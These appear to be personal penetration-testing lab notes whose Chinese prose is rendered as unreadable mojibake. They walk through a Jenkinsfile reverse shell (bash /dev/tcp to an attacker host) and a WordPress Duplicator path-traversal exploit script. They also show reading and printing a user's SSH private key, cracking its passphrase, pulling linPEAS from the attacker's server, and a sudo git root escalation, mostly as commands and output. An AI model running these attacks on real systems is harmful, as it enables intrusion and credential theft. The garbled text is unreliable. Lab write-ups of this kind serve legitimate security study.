å¯èƒ½æ“æœ‰ S3 å¯«å…¥æ¬Šé™ï¼Œå¯ä»¥å˜—è©¦ä¿®æ”¹

##### 3.3  IAM è§’è‰²æ¬Šé™
![image](https://hackmd.io/_uploads/r11kX4E21g.png)
> IAM å…è¨± Lambda å­˜å– S3 bucketï¼Œä½† æ¬Šé™æœ‰é™\
æ›´é«˜æ¬Šé™çš„ AWS Key å¯èƒ½å„²å­˜åœ¨ Jenkins

>[!Note]
>ç¾åœ¨å¯ä»¥ç·¨è¼¯ Jenkinsfileï¼Œä½†éœ€è¦ç¢ºèª**å¦‚ä½•è§¸ç™¼ build**ã€‚Jenkins å¯èƒ½è¢«è¨­å®šç‚ºåªèƒ½ manual interventionï¼Œå¦‚æœæ˜¯é€™ç¨®æƒ…æ³ï¼Œæˆ‘å€‘å°±éœ€è¦ç¹¼çºŒæ¢ç´¢ã€‚\
Jenkins ä¹Ÿæœ‰å¯èƒ½è¢«è¨­å®šç‚º routinely execute Pipelineï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘ç„¡æ³•ç«‹å³è§¸ç™¼å®ƒï¼Œå¿…é ˆç­‰å¾…å®ƒè‡ªå‹•åŸ·è¡Œã€‚å¦å¤–ï¼ŒJenkins å¯èƒ½æœƒåœ¨ repo è®Šæ›´æ™‚è‡ªå‹•åŸ·è¡Œå»ºç½®ï¼Œé€šå¸¸æ˜¯é€é SCM Serverï¼ˆå¦‚ Gitea æˆ– GitHubï¼‰ç™¼é€ Webhook è§¸ç™¼ã€‚

#### 4. æª¢æŸ¥ Webhook è¨­å®š
![image](https://hackmd.io/_uploads/HJLcNENh1x.png)
![image](https://hackmd.io/_uploads/HyE1rNVhyg.png)
> Webhook è¢«è¨­å®šç‚ºã€ŒGit push to a repository æ™‚è§¸ç™¼ Jenkins Pipelineã€\
é€™ä»£è¡¨æˆ‘å€‘å¯ä»¥é€éä¿®æ”¹ Jenkinsfileï¼Œè®“ Pipeline è‡ªå‹•åŸ·è¡Œ

### Modifying the Pipeline
åˆ©ç”¨ CI/CD Pipeline æ¤å…¥æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œä»¥ç²å– Jenkins å»ºç½®ä¼ºæœå™¨çš„å­˜å–æ¬Šé™

ç›®æ¨™: å–å¾— AWS å­˜å–é‡‘é‘°ä¸¦å˜—è©¦å…¥ä¾µ AWS ç’°å¢ƒ
- ä¿®æ”¹ Jenkinsfile æ¤å…¥åå‘ Shell
- è§¸ç™¼ Jenkins Webhook è®“æƒ¡æ„ä»£ç¢¼åŸ·è¡Œ
- å–å¾— Jenkins å»ºç½®ä¼ºæœå™¨çš„ Shell å­˜å–æ¬Šé™
- åœ¨å»ºç½®ä¼ºæœå™¨ä¸Šé€²è¡Œç’°å¢ƒåµæŸ¥
- ç™¼ç¾ AWS å­˜å–é‡‘é‘°ï¼Œæº–å‚™é€²ä¸€æ­¥æ”»æ“Š

#### 1. ç·¨è¼¯ Jenkinsfileï¼Œæ¤å…¥ Reverse Shell
ä¿ç•™åŸæœ¬çš„ AWS é‡‘é‘°è¨­å®šï¼ˆç¢ºä¿ pipeline èƒ½å­˜å– AWSï¼‰ï¼Œä½¿ç”¨ `sh` åŸ·è¡Œåå‘ Shellï¼Œé€é `bash -c` ç¢ºä¿æŒ‡ä»¤åœ¨ Jenkins ä¼ºæœå™¨æ­£ç¢ºåŸ·è¡Œ\
è¨­å®š Shell é€£å› Kali ï¼Œä¸¦æ”¾å…¥èƒŒæ™¯åŸ·è¡Œ (&)
>[!Note]
>Jenkinsfile çš„èªæ³•æ˜¯åŸºæ–¼ [domain-specific language (DSL)](https://en.wikipedia.org/wiki/Domain-specific_language) ã€‚é€™æ„å‘³è‘—æˆ‘å€‘éœ€è¦ç”¨ Jenkins DSL èªæ³•ä¾†ç·¨å¯« Reverse shell

åŸå§‹ `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        echo 'Building..'
      }
    }
  }
}
```
ä¿®æ”¹å¾Œ `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.168.45.168/8888 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```
>[!Caution]
ç·©ç·©
LAB restart å¾Œï¼Œadministrator å°±ä¸é€²å»äº†

# Assembling the Pieces
æ¨¡æ“¬ä¸€å ´çœŸå¯¦çš„æ»²é€æ¸¬è©¦
- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

## Enumerating the Public Network
Enumerating å…¬é–‹ç¶²è·¯ä¸Šçš„æ©Ÿå™¨
![image](https://hackmd.io/_uploads/rycUywEn1l.png)
- MAILSRV1
- WEBSRV1

### MAILSRV1
#### 1. å»ºç«‹å·¥ä½œç’°å¢ƒ
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ mkdir beyond
cd beyond
mkdir mailsrv1
mkdir websrv1
touch creds.txt
```
> `creds.txt`:æ‰¾åˆ°çš„ä½¿ç”¨è€…å¸³è™Ÿèˆ‡å¯†ç¢¼

### 2. Nmap æƒæ MAILSRV1
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.117.242 

[sudo] password for chw: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:06 EDT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 91.67% done; ETC: 06:07 (0:00:00 remaining)
Nmap scan report for 192.168.117.242
Host is up (0.099s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN OK CAPABILITY completed RIGHTS=texkA0001 ACL QUOTA IMAP4 IMAP4rev1 NAMESPACE IDLE SORT
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-17T10:06:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
> `-oN`ï¼šå°‡çµæœå„²å­˜åˆ° `mailsrv1/nmap` æª”æ¡ˆä¸­
> > æ©Ÿå™¨æ˜¯ Windows ç³»çµ±\
 IIS 10.0 Web Server\
 hMailServer éƒµä»¶ä¼ºæœå™¨\
å¤šå€‹èˆ‡é›»å­éƒµä»¶ç›¸é—œçš„ port (SMTP, POP3, IMAP)\
æœ‰ NetBIOS èˆ‡ SMB æœå‹™ï¼ˆå¯èƒ½å…è¨±å…§éƒ¨æ©«å‘ç§»å‹•ï¼‰

### 3. ç ”ç©¶ [hMailServer](https://www.hmailserver.com/) çš„æ½›åœ¨æ¼æ´
- æŸ¥è©¢ hMailServer å®˜æ–¹ç¶²ç«™ äº†è§£åŠŸèƒ½èˆ‡ç‰ˆæœ¬æ­·å²
- Google æœå°‹ CVE
- ä½¿ç”¨ Exploit-DB æˆ– Metasploit ä¾†å°‹æ‰¾å¯ç”¨çš„æ”»æ“Šæ‰‹æ³•

![image](https://hackmd.io/_uploads/BkD8BOB3yl.png)
> é™¤äº†ä¸€äº›è¼ƒèˆŠçš„ CVE å¤–ï¼Œæ²’æœ‰å…¶ä»–ç·šç´¢
#### 4. æƒæ IIS ä¼ºæœå™¨
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ gobuster dir -u http://192.168.117.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```
æˆ–
```
â”Œâ”€â”€(chwã‰¿CHW)-[~]
â””â”€$ dirsearch -u http://192.168.117.242 -e * -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
> æ²’æœ‰æ˜é¡¯æœ‰æ•ˆçš„æª”æ¡ˆæˆ–ç›®éŒ„


### WEBSRV1
#### 1. Nmap æƒæ WEBSRV1
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.117.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:20 EDT
Nmap scan report for 192.168.117.244
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.117.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
```
> `22/tcp`ï¼šSSH ï¼Œä½¿ç”¨ OpenSSH 8.9p1\
`80/tcp`ï¼šHTTP æœå‹™ï¼Œé‹è¡Œ Apache 2.4.52

#### 2. åˆ†æ Ubuntu 22.04 çš„ SSH æœå‹™
æœå°‹ OpenSSH 8.9p1 Ubuntu 3 ä¾†äº†è§£é€™å€‹ç‰ˆæœ¬çš„ Ubuntu æ˜¯å¦æœ‰å·²çŸ¥æ¼æ´\
![image](https://hackmd.io/_uploads/By_vduHn1x.png)
> ç¢ºèªé€™å°æ©Ÿå™¨é‹è¡Œçš„æ˜¯ Ubuntu 22.04 (Jammy Jellyfish)

#### 3. æƒæ Apache 2.4.52 ç¶²ç«™
- ç›´æ¥è¨ªå•ç¶²ç«™ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰æ•æ„Ÿä¿¡æ¯æ´©æ¼ã€‚
- æª¢æŸ¥ HTML åŸå§‹ç¢¼ï¼Œå°‹æ‰¾ CMSã€æ¡†æ¶æˆ–å…¶ä»–æŠ€è¡“è³‡è¨Šã€‚
- ä½¿ç”¨å·¥å…·åµæ¸¬ç¶²ç«™æŠ€è¡“å †ç–Šï¼ˆå¦‚ whatwebï¼‰ã€‚
- ä½¿ç”¨ WordPress å°ˆé–€çš„æƒæå·¥å…·ï¼ˆWPScanï¼‰ä¾†æª¢æŸ¥æ¼æ´ã€‚

ç¢ºèª WordPress ç‰ˆæœ¬:
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ whatweb http://192.168.117.244
http://192.168.117.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], RedirectLocation[http://192.168.117.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.117.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2] 
```
> WordPress[6.0.2] ã€ ç¶²ç«™ä½¿ç”¨ jQuery 3.6.0

ä½¿ç”¨ WPScan æƒæ WordPress:
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ wpscan --url http://192.168.117.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ cat websrv1/wpscan 
...
[+] duplicator
 | Location: http://192.168.117.244/wp-content/plugins/duplicator/
 | Last Updated: 2025-03-11T14:31:00.000Z
 | Readme: http://192.168.117.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.12
...
```
> `--enumerate p`: enumerate å·²å®‰è£çš„ plugins\
`--plugins-detection aggressive`: ä½¿ç”¨ Aggressive æ¨¡å¼ä¾†æª¢æ¸¬ plugins\
`-o websrv1/wpscan`: çµæœ è¼¸å‡ºåˆ° websrv1/wpscan 
>> duplicator ç‰ˆæœ¬ 1.3.26ï¼Œå·²éæ™‚ï¼

#### 4. æœå°‹ Duplicator plugin çš„æ¼æ´
ä½¿ç”¨ searchsploit ä¾†æœå°‹ Duplicator 1.3.26 çš„å·²çŸ¥æ¼æ´
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ searchsploit duplicator
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                           | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forg | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                     | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                    | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read     | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Me | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download          | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                   | php/webapps/50993.txt
WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Expos | php/webapps/51874.py
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forg | php/webapps/40908.html
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
>`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py`\
`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb`

## Attacking a Public Machine
åˆ©ç”¨å‰é¢æ”¶é›†åˆ°çš„è³‡è¨Šä¾†å…¥ä¾µ WEBSRV1
### Initial Foothold
#### 1. æŸ¥è©¢ä¸‹è¼‰ exploit
æŸ¥çœ‹ exploit
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ searchsploit -x 50420
# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
# Date: October 16, 2021
# Exploit Author: nam3lum
# Vendor Homepage: https://wordpress.org/plugins/duplicator/
# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
# Version: 1.3.26
# Tested on: Ubuntu 16.04
# CVE : CVE-2020-11738

import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```
> Path Traversal

```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ searchsploit -m 50420 
```
#### 2. é€é exploit åˆ©ç”¨æ¼æ´
##### 2.1 è®€å– `/etc/passwd`
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 50420.py http://192.168.117.244 /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
> User: `daniela` å’Œ `marcus`

##### 2.2 å˜—è©¦è®€å– SSH ç§é‘° (id_rsa)
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 50420.py http://192.168.117.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!
                                                                                                               
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ python3 50420.py http://192.168.117.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```
> æˆåŠŸè®€å– daniela çš„ SSH ç§é‘°

#### 3. ä½¿ç”¨ SSH ç§é‘°å˜—è©¦ç™»å…¥
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ echo "PRIVATE_KEY_CONTENT" > id_rsa
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$  chmod 600 id_rsa          
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ ssh -i id_rsa daniela@192.168.117.244

The authenticity of host '192.168.117.244 (192.168.117.244)' can't be established.
ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.117.244' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```
> SSH ç§é‘°å—åˆ°å¯†ç¢¼ä¿è­·ï¼Œéœ€è¦ç ´è§£å¯†ç¢¼

#### 4. ç ´è§£ SSH ç§é‘°å¯†ç¢¼
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ ssh2john id_rsa > ssh.hash
                       
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:35 0.01% (ETA: 2025-03-22 23:14) 0g/s 35.26p/s 35.26c/s 35.26C/s dragons..poohbear1
tequieromucho    (id_rsa)     
1g 0:00:00:39 DONE (2025-03-17 07:05) 0.02502g/s 35.23p/s 35.23c/s 35.23C/s jesse..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```
SSH ç™»å…¥ï¼š
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ ssh -i id_rsa daniela@192.168.117.244                  
Enter passphrase for key 'id_rsa': tequieromucho
...
Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
daniela@websrv1:~$ whoami
daniela
```
> æˆåŠŸæ»²é€ç¬¬ä¸€å°æ©Ÿå™¨

>[!Note]
>è¨˜éŒ„å–å¾—çš„å¸³è™Ÿè³‡è¨Š\
> `echo "daniela: tequieromucho" >> creds.txt`
### A Link to the Past
ç›®å‰å·²å–å¾— `WEBSRV1` çš„ `daniela` ä½¿ç”¨è€…æ¬Šé™\
æ¥è‘—ä½¿ç”¨ linPEAS æ”¶é›†è³‡è¨Š
#### 1. ä½¿ç”¨ linPEAS é€²è¡Œæœ¬æ©Ÿè³‡è¨Šæ”¶é›†
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond/websrv1]
â””â”€$ cp /usr/share/peass/linpeas/linpeas.sh .
                                                                                                               
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond/websrv1]
â””â”€$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
daniela@websrv1:~$ wget http://192.168.45.214/linpeas.sh
daniela@websrv1:~$ chmod +x ./linpeas.sh 
daniela@websrv1:~$ ./linpeas.sh
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Operative system
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Github Files (limit 70)
                                                                                                                                
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```
> ç³»çµ±: Ubuntu 22.04.1 LTS\
> `daniela` å¯ä»¥ä¸ç”¨å¯†ç¢¼ä½¿ç”¨ `sudo git`\
> WordPress è³‡æ–™åº«: `wordpress`:`DanielKeyboard3311`\
> èƒ½å¤ è®€å– `.git`: æŸ¥çœ‹éå»çš„è®Šæ›´ï¼Œç”šè‡³æ‰¾åˆ°æ•æ„Ÿè³‡è¨Š

å…ˆå°‡æ†‘è­‰å­˜å…¥ `creds.txt`
```
â”Œâ”€â”€(chwã‰¿CHW)-[~/beyond]
â””â”€$ echo "DB_USER: wordpress, DB_PASSWORD: DanielKeyboard3311" >> creds.txt
```
#### 2. æ¿«ç”¨ sudo git é€²è¡Œææ¬Š
æŸ¥çœ‹ [GTFOBins](https://gtfobins.github.io/gtfobins/git/) ææ¬Šæ–¹æ³•ï¼š
```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```
> é€™å€‹æ–¹æ³•è¢«ç³»çµ±å°é–

å˜—è©¦ç¬¬äºŒç¨®æ–¹æ³•ï¼š`sudo git`
```
daniela@websrv1:~$ sudo git -p help config
...
       â€¢   no section or name was provided (ret=2),

       â€¢   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root
```
> å‘¼å« execute codeï¼Œå†ä½¿ç”¨ ! + Command\
> æˆåŠŸå° `WEBSRV1` ææ¬Š

